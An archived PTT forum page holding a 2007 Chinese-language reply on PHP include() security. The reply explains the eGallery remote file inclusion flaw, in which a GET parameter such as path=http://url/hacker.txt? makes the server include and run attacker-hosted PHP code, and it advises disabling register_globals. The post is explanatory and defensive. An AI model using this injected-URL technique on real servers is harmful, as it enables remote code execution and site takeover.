<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		

<meta name="viewport" content="width=device-width, initial-scale=1">

<title>Re: [閒聊] 關於安全性 - 看板 PHP - 批踢踢實業坊</title>
<meta name="robots" content="all">
<meta name="keywords" content="Ptt BBS 批踢踢">
<meta name="description" content="eGallery有一個著名的漏洞，他有一個程式用global變數傳遞目錄名稱，然後再
include 目錄名＋檔案名.....
結果有人就用這個方法入侵：
在一個遠端網站，放置一個純文字檔案，例如hacker.txt
然後用get的方式對程式傳入相同名稱的變數，例如path=http://url/hacker.txt?
">
<meta property="og:site_name" content="Ptt 批踢踢實業坊">
<meta property="og:title" content="Re: [閒聊] 關於安全性">
<meta property="og:description" content="eGallery有一個著名的漏洞，他有一個程式用global變數傳遞目錄名稱，然後再
include 目錄名＋檔案名.....
結果有人就用這個方法入侵：
在一個遠端網站，放置一個純文字檔案，例如hacker.txt
然後用get的方式對程式傳入相同名稱的變數，例如path=http://url/hacker.txt?
">
<link rel="canonical" href="https://www.ptt.cc/bbs/PHP/M.1169995564.A.F1C.html">

<link rel="stylesheet" type="text/css" href="//images.ptt.cc/bbs/v2.27/bbs-common.css">
<link rel="stylesheet" type="text/css" href="//images.ptt.cc/bbs/v2.27/bbs-base.css" media="screen">
<link rel="stylesheet" type="text/css" href="//images.ptt.cc/bbs/v2.27/bbs-custom.css">
<link rel="stylesheet" type="text/css" href="//images.ptt.cc/bbs/v2.27/pushstream.css" media="screen">
<link rel="stylesheet" type="text/css" href="//images.ptt.cc/bbs/v2.27/bbs-print.css" media="print">




	<script async src='/cdn-cgi/challenge-platform/h/g/scripts/invisible.js?ts=1653465600'></script></head>
    <body>
		
<div id="topbar-container">
	<div id="topbar" class="bbs-content">
		<a id="logo" href="/bbs/">批踢踢實業坊</a>
		<span>&rsaquo;</span>
		<a class="board" href="/bbs/PHP/index.html"><span class="board-label">看板 </span>PHP</a>
		<a class="right small" href="/about.html">關於我們</a>
		<a class="right small" href="/contact.html">聯絡資訊</a>
	</div>
</div>
<div id="navigation-container">
	<div id="navigation" class="bbs-content">
		<a class="board" href="/bbs/PHP/index.html">返回看板</a>
		<div class="bar"></div>
	</div>
</div>
<div id="main-container">
    <div id="main-content" class="bbs-screen bbs-content"><div class="article-metaline"><span class="article-meta-tag">作者</span><span class="article-meta-value">fillano (冒牌費大公)</span></div><div class="article-metaline-right"><span class="article-meta-tag">看板</span><span class="article-meta-value">PHP</span></div><div class="article-metaline"><span class="article-meta-tag">標題</span><span class="article-meta-value">Re: [閒聊] 關於安全性</span></div><div class="article-metaline"><span class="article-meta-tag">時間</span><span class="article-meta-value">Sun Jan 28 22:45:59 2007</span></div>
<span class="f2">※ 引述《MrMarcus (請勿忘記密碼)》之銘言：
</span><span class="f6">: ※ 引述《chweng ()》之銘言：
</span><span class="f6">: : 沒那麼誇張吧？
</span><span class="f6">: : 就算是去 include 別人的 url，也祇會收到對方處理過後的資料而已，
</span><span class="f6">: : 應該不會接收到對方處理過程中所用的變數。
</span><span class="f6">: : 我剛剛試了一下，應該是沒辦法用這方法讀到才對，
</span><span class="f6">: : 或者我誤會你的意思了？可以請你實作一個看看嗎？
</span><span class="f6">: : 有一種比較常見的情況是，某些程式會以 inc 為副檔名，
</span><span class="f6">: : 但偏偏 server 又忘了把這類檔案的 MIME type 設成 application/x-httpd-php，
</span><span class="f6">: : 導致 server 直接以 text/plain 直接把程式碼全給倒出來…
</span><span class="f6">: : 如果這時候程式中剛好又含有重要資訊的話，就直接被別人看光光了。
</span><span class="f6">: : 不過這時候也不需要 include，直接踹到該 inc 正確的位置就可以了……
</span><span class="f6">: include(&#34;<a href="http://&#34;)" target="_blank" rel="noreferrer noopener nofollow">http://&#34;)</a> 這種方式只能擷取到對方web server執行完後送出的html
</span><span class="f6">: （或者其他格式）內容，這樣是不會抓到對方的PHP原始碼的（除非就像c網友所
</span><span class="f6">: 提到的狀況）。不過include在多人共用的伺服器上面確實有可能把其他使用者
</span><span class="f6">: 的程式碼抓進來，例如在虛擬主機上面，這種狀況是有可能發生的（其他檔案
</span><span class="f6">: 操作的功能也一樣）。PHP對於這個問題有提供一些方式去防止使用者試圖
</span><span class="f6">: 去include/require/fopen()他們不該看到的檔案，請查詢關於safe mode的資料。
</span><span class="f6">: <a href="http://www.php.net/manual/en/features.safe-mode.php" target="_blank" rel="noreferrer noopener nofollow">http://www.php.net/manual/en/features.safe-mode.php</a>
</span>eGallery有一個著名的漏洞，他有一個程式用global變數傳遞目錄名稱，然後再
include 目錄名＋檔案名.....

結果有人就用這個方法入侵：
在一個遠端網站，放置一個純文字檔案，例如hacker.txt
然後用get的方式對程式傳入相同名稱的變數，例如path=<a href="http://url/hacker.txt?" target="_blank" rel="noreferrer noopener nofollow">http://url/hacker.txt?</a>
然後當程式include($path.&#34;file&#34;)時 --&gt; 會變成
include(&#34;<a href="http://url/hacker.txt?file&#34;)........" target="_blank" rel="noreferrer noopener nofollow">http://url/hacker.txt?file&#34;)........</a>
純文字檔的內容只要包在&lt;?php ?&gt;之間，就會被執行。接下來可以做的事情就多了

所以include還是可能因為這樣出問題的。當然，關掉register_global，嚴格區分
一般變數、get、post、cookie等，就可以盡量避免這個問題。

--
Sapere Aude! 這就是啟蒙運動的口號！

--
<span class="f2">※ 發信站: 批踢踢實業坊(ptt.cc) 
</span>◆ From: 60.248.166.83
</div>
    
    <div id="article-polling" data-pollurl="/poll/PHP/M.1169995564.A.F1C.html?cacheKey=2148-469786788&amp;offset=1865&amp;offset-sig=f3a044c79c99c889b49234504647427e117de33e" data-longpollurl="/v1/longpoll?id=4dafbd32d68ede7c553fc620dae8876edcfb0b03" data-offset="1865"></div>
    

    
</div>

		

<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-32365737-1', {
    cookieDomain: 'ptt.cc',
    legacyCookieDomain: 'ptt.cc'
  });
  ga('send', 'pageview');
</script>


		
<script src="//ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="//images.ptt.cc/bbs/v2.27/bbs.js"></script>

    <script type="text/javascript">(function(){window['__CF$cv$params']={r:'710ceac08dd614d0',m:'SGYnFbSkG.TMXWwuXybwbMVzezV1xQjUFp2.mBXTF.Y-1653467509-0-AaQ9mj2RsfsY0n9pQH+Q0e26htAg+e6lAlBwj0bhDWQzDBTRdZ9rNLmz2KbeESCl9POU85dH8dYJyHQXlILEX/IShPy4YAM1IbjiVFVH7GaolJaL8yTFKroTIF7kHjkvjadRc1Ttp82gO7XDYb19PpjkZkt5LJYif5x5lTQMX3T4',s:[0x60aba8d7a2,0xa9f87b7afc],u:'/cdn-cgi/challenge-platform/h/g'}})();</script></body>
</html>
